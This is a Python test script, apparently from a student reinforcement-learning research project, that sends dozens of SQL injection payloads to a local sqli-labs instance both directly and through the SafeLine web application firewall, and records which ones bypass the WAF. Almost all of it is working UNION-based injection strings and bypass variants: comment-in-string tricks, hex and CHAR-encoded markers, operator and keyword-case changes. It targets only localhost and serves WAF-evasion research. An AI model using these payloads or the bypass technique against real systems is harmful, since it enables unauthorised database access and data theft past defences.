"""
bypass_lab/test_comment_in_string.py
=====================================
Pattern ditemukan user: .1-- -'/0 UNION ALL SELECT 1,2,3'

Mekanisme:
  1. '.1-- -' = string literal di eyes MySQL (bukan comment)
     Tapi Safeline's parser BERHENTI di '-- -' → tidak lihat UNION SELECT
  2. '/0' = division by zero → WHERE NULL → 0 rows dari main query
  3. UNION ALL SELECT → inject data
  4. '' di akhir = string alias untuk last column (valid MySQL!)
     ATAU: -- - di akhir comment out template's closing quote

Goal: temukan payload yang:
  - Safeline PASS (karena '-- -' trick)
  - MySQL valid + return SEQSQLI_START/SEQSQLI_END

Run:
    python3 -m bypass_lab.test_comment_in_string
"""
import sys, time
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
from seqsqli.core.response import classify_response
import requests

PLAIN = "http://localhost:8081/Less-1/"
WAF   = "http://localhost:8888/Less-1/"

# Hex-encoded markers (no quotes needed, no CHAR issues)
HEX_START = "0x534551534c495f5354415254"   # 'SEQSQLI_START'
HEX_END   = "0x534551534c495f454e44"       # 'SEQSQLI_END'

# CHAR-encoded markers
CHAR_START = "CHAR(83,69,81,83,81,76,73,95,83,84,65,82,84)"
CHAR_END   = "CHAR(83,69,81,83,81,76,73,95,69,78,68)"

FOUND = []


def t(label, payload):
    rp = requests.get(PLAIN, params={"id": payload}, timeout=8)
    rw = requests.get(WAF,   params={"id": payload}, timeout=8)

    plain_ok  = classify_response(rp.text, rp.status_code, "union",
                                  strict_markers=True) == "SUCCESS"
    plain_err = "syntax" in rp.text.lower() or "error" in rp.text.lower()
    waf_ok    = classify_response(rw.text, rw.status_code, "union",
                                  strict_markers=True) == "SUCCESS"
    waf_pass  = rw.status_code != 403

    p_tag = "OK" if plain_ok else ("ERR" if plain_err else "NODATA")
    w_tag = "*** BYPASS ***" if waf_ok else ("PASS" if waf_pass else "BLOCK")

    print(f"  plain={p_tag:<8} waf={w_tag:<16} | {label}")
    if waf_ok:
        FOUND.append(("BYPASS", label, payload))
        print(f"    {payload[:100]}")
    elif waf_pass and plain_ok:
        FOUND.append(("NEAR", label, payload))
        print(f"    *** NEAR MISS — WAF pass + SQL valid ***")
        print(f"    {payload[:100]}")
    time.sleep(0.3)


print("=" * 65)
print(" comment-in-string bypass: .N-- -'/0 UNION ALL SELECT")
print("=" * 65)

# ── 1. Reproduksi user's original payload ─────────────────────────────
print("\n[1] User's original payload (baseline)")
t("user original 1,2,3",
  ".1-- -'/0 UNION ALL SELECT 1,2,3'")

# ── 2. Dengan hex markers ─────────────────────────────────────────────
print("\n[2] Hex markers — no quotes needed")
t("hex markers + comment end",
  f".1-- -'/0 UNION ALL SELECT database(),{HEX_START},{HEX_END}-- -")
t("hex markers + quote alias end",
  f".1-- -'/0 UNION ALL SELECT database(),{HEX_START},{HEX_END}'")
t("hex markers + hash end",
  f".1-- -'/0 UNION ALL SELECT database(),{HEX_START},{HEX_END}#")

# ── 3. Dengan CHAR markers ────────────────────────────────────────────
print("\n[3] CHAR markers")
t("CHAR markers + comment end",
  f".1-- -'/0 UNION ALL SELECT database(),{CHAR_START},{CHAR_END}-- -")
t("CHAR markers + quote alias",
  f".1-- -'/0 UNION ALL SELECT database(),{CHAR_START},{CHAR_END}'")
t("CHAR markers + hash",
  f".1-- -'/0 UNION ALL SELECT database(),{CHAR_START},{CHAR_END}#")

# ── 4. Variasi angka di depan ─────────────────────────────────────────
print("\n[4] Variasi prefix float")
for prefix in [".1", ".2", ".5", "1.", "0.", ".01", ".6e0", ".9"]:
    t(f"prefix={prefix} hex",
      f"{prefix}-- -'/0 UNION ALL SELECT database(),{HEX_START},{HEX_END}-- -")

# ── 5. Variasi comment style ──────────────────────────────────────────
print("\n[5] Variasi comment di tengah")
for cmt in ["-- -", "--+-", "-- +", "--  ", "-- a"]:
    label = f"cmt={repr(cmt)}"
    t(label, f".1{cmt}'/0 UNION ALL SELECT database(),{HEX_START},{HEX_END}-- -")

# ── 6. Tanpa /0 ───────────────────────────────────────────────────────
print("\n[6] Tanpa /0 (langsung UNION setelah quote)")
t("no /0 + hex",
  f".1-- -' UNION ALL SELECT database(),{HEX_START},{HEX_END}-- -")
t("no /0 + CHAR",
  f".1-- -' UNION ALL SELECT database(),{CHAR_START},{CHAR_END}-- -")
t("no /0 + OR NULL",
  f".1-- -' OR NULL UNION ALL SELECT database(),{HEX_START},{HEX_END}-- -")

# ── 7. Variasi operator setelah quote ─────────────────────────────────
print("\n[7] Variasi operator pengganti /0")
for op in ["/0", "*0", "%0", "-0", "+0", "/NULL", "^0", "&0", "|0"]:
    t(f"op={op}",
      f".1-- -'{op} UNION ALL SELECT database(),{HEX_START},{HEX_END}-- -")

# ── 8. Variasi UNION style ────────────────────────────────────────────
print("\n[8] Variasi UNION keywords")
for u in ["UNION ALL SELECT", "UNION SELECT", "UNION DISTINCT SELECT",
          "UNION ALL SELECT", "union all select", "uNiOn aLl sElEcT"]:
    t(f"{u[:20]}",
      f".1-- -'/0 {u} database(),{HEX_START},{HEX_END}-- -")

# ── Summary ───────────────────────────────────────────────────────────
print("\n" + "=" * 65)
bypasses = [x for x in FOUND if x[0] == "BYPASS"]
nears    = [x for x in FOUND if x[0] == "NEAR"]
print(f" BYPASS: {len(bypasses)}  |  NEAR MISS: {len(nears)}")
for tag, label, p in FOUND:
    print(f"\n  [{tag}] {label}")
    print(f"  {p[:110]}")
